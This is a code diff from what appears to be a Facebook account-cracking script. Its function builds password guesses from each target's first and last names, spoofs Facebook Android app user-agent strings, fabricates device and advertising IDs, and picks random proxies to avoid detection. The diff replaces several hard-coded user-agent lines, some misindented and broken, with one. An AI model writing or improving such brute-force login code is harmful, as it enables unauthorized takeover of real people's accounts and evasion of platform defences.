@@ -483,14 +483,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a = ";[FBAN/FB4A;FBAV/383.0.0.23.106;FBPN/com.facebook.katana;FBLC/en_US;FBBV/316614371;FBCR/C-Spire Wireless;FBMF/Samsung;FBBD/samsung;FBDV/SM-A605F;FBSV/13.9.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=914,height=972};]"
-    f = ";[FBAN/FB4A;FBAV/376.0.0.12.108;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/315213325;FBCR/Netzclub;FBMF/Samsung;FBBD/samsung;FBDV/SM-M536B;FBSV/13.6.0;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=1.8,width=1244,height=2270};FB_FW/1;]"
-    g = ";[FBAN/FB4A;FBAV/387.0.0.24.102;FBBV/317416518;FBDM/{density=1.75,width=917,height=1540};FBLC/en_GB;FBRV/317803564;FB_FW/2;FBCR/Pioneer Mobile;FBMF/LG;FBBD/lg;FBPN/com.facebook.katana;FBDV/LGX230Z;FBSV/15.7.2;FBOP/20;FBCA/x86_64:arm64-v8a:armeabi-v7a;]"
-    l = ";[FBAN/FB4A;FBAV/375.0.0.26.111;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/315015017;FBCR/Virgin Mobile Canada;FBMF/Lava;FBBD/lava;FBDV/A450;FBSV/15.6.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1095,height=2336};FB_FW/1;]"
-    h = ";[FBAN/FB4A;FBAV/472.0.0.45.79;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/453410037;FBCR/OVO Mobile;FBMF/Lava;FBBD/lava;FBDV/A200;FBSV/15.9.3;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=2.5,width=928,height=1122};FB_FW/1;]" 
-    j = ";[FBAN/FB4A;FBAV/376.0.0.12.108;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/315213325;FBCR/Netzclub;FBMF/Samsung;FBBD/samsung;FBDV/SM-M536B;FBSV/13.6.0;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=1.8,width=1244,height=2270};FB_FW/1;]"
-    k = ";[FBAN/FB4A;FBAV/359.0.0.30.118;FBPN/com.facebook.katana;FBLC/en_US;FBBV/311816631;FBCR/Mint Mobile;FBMF/Lenovo;FBBD/lenovo;FBDV/Z6 Lite;FBSV/15.6.2;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=1.625,width=1302,height=1708};FB_FW/1;]"
-
+                                u1a = "[FBAN/FB4A;FBAV/375.0.0.26.111;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/315015017;FBCR/Virgin Mobile Canada;FBMF/Lava;FBBD/lava;FBDV/A450;FBSV/15.6.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1095,height=2336};FB_FW/1;]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
